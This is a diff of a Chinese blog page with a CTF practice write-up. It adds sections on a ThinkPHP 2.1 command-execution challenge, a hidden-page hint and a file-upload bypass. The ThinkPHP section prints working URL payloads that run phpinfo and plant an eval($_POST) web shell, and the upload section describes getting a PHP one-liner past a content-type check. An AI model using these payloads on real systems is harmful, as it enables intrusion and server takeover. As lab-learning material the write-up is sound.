@@ -24,7 +24,7 @@
 <meta property="og:image" content="https://yd0ng.github.io/2020/02/02/CTF%E9%A2%98%E7%9B%AE%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/3.1.png">
 <meta property="og:image" content="https://yd0ng.github.io/2020/02/02/CTF%E9%A2%98%E7%9B%AE%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/3.2.png">
 <meta property="article:published_time" content="2020-02-02T05:13:26.000Z">
-<meta property="article:modified_time" content="2020-02-06T11:25:46.833Z">
+<meta property="article:modified_time" content="2020-02-08T07:48:04.233Z">
 <meta property="article:author" content="yd0ng">
 <meta property="article:tag" content="CTF">
 <meta name="twitter:card" content="summary">
@@ -234,6 +234,21 @@
 <p>发现确实存在.svn源码泄露<br>利用dvcs-ripper恢复源码</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rip-svn.pl -v -u http:&#x2F;&#x2F;192.168.2.115&#x2F;.svn&#x2F;</span><br></pre></td></tr></table></figure>
 <p>恢复了一个index.php ，查看文件得到flag</p>
+<h1 id="Less-07-coding"><a href="#Less-07-coding" class="headerlink" title="Less-07 coding"></a>Less-07 coding</h1><p>首页写着明显的thinkPHP2.1，于是去网上搜索漏洞，<br>发现可以执行命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.2.112&#x2F;index.php&#x2F;Index&#x2F;index&#x2F;name&#x2F;$%7B@phpinfo%28%29%7D</span><br></pre></td></tr></table></figure>
+<p>成功显示PHPinfo界面，<br>getshell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.2.112&#x2F;index.php&#x2F;module&#x2F;action&#x2F;param1&#x2F;$%7B@print(eval($_POST[shell]))%7D</span><br></pre></td></tr></table></figure>
+<p>菜刀连接成功，查看index.php代码发现flag</p>
+<h1 id="Less-08-平衡权限的威胁"><a href="#Less-08-平衡权限的威胁" class="headerlink" title="Less-08 平衡权限的威胁"></a>Less-08 平衡权限的威胁</h1><p>访问首页，提示</p>
+<blockquote>
+<p>看不见的，不代表没有</p>
+</blockquote>
+<p>查看源代码，发现提示</p>
+<blockquote>
+<p>注意URL变化</p>
+</blockquote>
+<p>很明显的看到有index.html,index-1.html,index-3.html,缺少index-2.html,访问index-2.html,提示禁止访问，我们可以直接查看它的源代码，发现flag</p>
+<h1 id="Less-09-文件上传的突破"><a href="#Less-09-文件上传的突破" class="headerlink" title="Less-09 文件上传的突破"></a>Less-09 文件上传的突破</h1><p>访问首页是一个文件上传页面，直接传php一句话失败，抓包改content-type为image/jpeg,成功得到flag</p>
 <h1 id="未完待续"><a href="#未完待续" class="headerlink" title="未完待续~"></a>未完待续~</h1>
       
       
@@ -389,7 +404,7 @@
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-01-不合理的验证方式"><span class="toc-number">1.</span> <span class="toc-text">Less-01 不合理的验证方式</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-02-base64加解密与sql构造"><span class="toc-number">2.</span> <span class="toc-text">Less-02 base64加解密与sql构造</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-03-一个SQL引发的血案"><span class="toc-number">3.</span> <span class="toc-text">Less-03 一个SQL引发的血案</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-04-管理员的诟病"><span class="toc-number">4.</span> <span class="toc-text">Less-04 管理员的诟病</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-05-备份信息的泄露"><span class="toc-number">5.</span> <span class="toc-text">Less-05 备份信息的泄露</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-06-svn信息泄露"><span class="toc-number">6.</span> <span class="toc-text">Less-06 svn信息泄露</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#未完待续"><span class="toc-number">7.</span> <span class="toc-text">未完待续~</span></a></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-01-不合理的验证方式"><span class="toc-number">1.</span> <span class="toc-text">Less-01 不合理的验证方式</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-02-base64加解密与sql构造"><span class="toc-number">2.</span> <span class="toc-text">Less-02 base64加解密与sql构造</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-03-一个SQL引发的血案"><span class="toc-number">3.</span> <span class="toc-text">Less-03 一个SQL引发的血案</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-04-管理员的诟病"><span class="toc-number">4.</span> <span class="toc-text">Less-04 管理员的诟病</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-05-备份信息的泄露"><span class="toc-number">5.</span> <span class="toc-text">Less-05 备份信息的泄露</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-06-svn信息泄露"><span class="toc-number">6.</span> <span class="toc-text">Less-06 svn信息泄露</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-07-coding"><span class="toc-number">7.</span> <span class="toc-text">Less-07 coding</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-08-平衡权限的威胁"><span class="toc-number">8.</span> <span class="toc-text">Less-08 平衡权限的威胁</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-09-文件上传的突破"><span class="toc-number">9.</span> <span class="toc-text">Less-09 文件上传的突破</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#未完待续"><span class="toc-number">10.</span> <span class="toc-text">未完待续~</span></a></li></ol>
                     </div>
                 </span>
             </div>
